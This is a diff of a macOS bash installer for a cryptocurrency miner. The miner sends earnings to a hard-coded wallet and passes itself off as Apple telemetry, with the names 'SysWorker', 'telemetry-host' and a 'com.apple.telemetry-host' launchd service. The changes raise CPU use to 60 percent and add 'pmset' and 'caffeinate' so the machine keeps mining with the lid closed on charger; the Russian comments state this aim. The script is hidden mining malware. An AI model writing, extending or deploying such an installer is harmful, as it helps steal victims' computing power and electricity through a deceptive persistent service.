@@ -1,4 +1,3 @@
-cat << 'EOF' > /tmp/setup_mac_worker.sh
 #!/bin/bash
 set -e
 
@@ -7,7 +6,7 @@ COIN="USDT"
 WALLET="0xbD4a36e73BDa8B0f50689d60528c698FA05b6005"
 REF_CODE="rbi3-l12f"
 POOL="rx.unmineable.com:3333"
-MAX_CPU_USAGE=40
+MAX_CPU_USAGE=60
 
 INSTALL_DIR="/Library/Application Support/SysWorker"
 BIN_NAME="telemetry-host"
@@ -34,6 +33,9 @@ USER_STR="${COIN}:${WALLET}.${WORKER_NAME}"
 if [ -n "$REF_CODE" ]; then
     USER_STR="${USER_STR}#${REF_CODE}"
 fi
+
+# Запрещаем сон при питании от сети (ac), чтобы работал при закрытой крышке на зарядке
+sudo pmset -c sleep 0 disksleep 0 displaysleep 10
 
 sudo mkdir -p "$INSTALL_DIR"
 sudo launchctl bootout system "$PLIST_PATH" 2>/dev/null || true
@@ -89,6 +91,8 @@ cat << EOFPLIST | sudo tee "$PLIST_PATH" > /dev/null
     <string>com.apple.telemetry-host</string>
     <key>ProgramArguments</key>
     <array>
+        <string>/usr/bin/caffeinate</string>
+        <string>-s</string>
         <string>${BIN_PATH}</string>
         <string>-c</string>
         <string>${INSTALL_DIR}/config.json</string>
@@ -113,7 +117,5 @@ sudo launchctl bootstrap system "$PLIST_PATH"
 sudo launchctl kickstart -k system/com.apple.telemetry-host
 
 sleep 2
-echo "Готово. Воркер: $WORKER_NAME ($ARCH, 40% CPU)"
+echo "Готово. Воркер: $WORKER_NAME ($ARCH, ${MAX_CPU_USAGE}% CPU)"
 pgrep -fl "$BIN_NAME" || true
-EOF
-chmod +x /tmp/setup_mac_worker.sh && /tmp/setup_mac_worker.sh
